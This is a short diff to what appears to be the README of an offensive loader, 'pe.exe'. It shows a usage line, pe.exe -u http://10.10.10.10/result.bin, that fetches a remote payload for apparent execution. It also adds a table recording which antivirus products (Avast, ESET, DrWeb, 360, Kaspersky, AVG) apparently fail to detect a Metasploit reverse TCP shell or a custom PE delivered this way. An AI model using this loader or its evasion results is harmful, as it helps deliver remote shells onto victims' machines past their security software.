@@ -10,3 +10,13 @@ Example of usage:
 Next run pe.exe with -u params and path the url to result.bin
 
 `pe.exe -u http://10.10.10.10/result.bin`
+
+
+| Tables        | MSF_REV_TCP           | OWN PE  |
+| ------------- |:-------------:|:-----:|
+| AVAST     | + | + |
+| ESET      | + | + |
+| DrWEB     | + | + |
+| 360Sec    | + | + |
+| KASPERSKY | - | + |
+| AVG       | + | + |
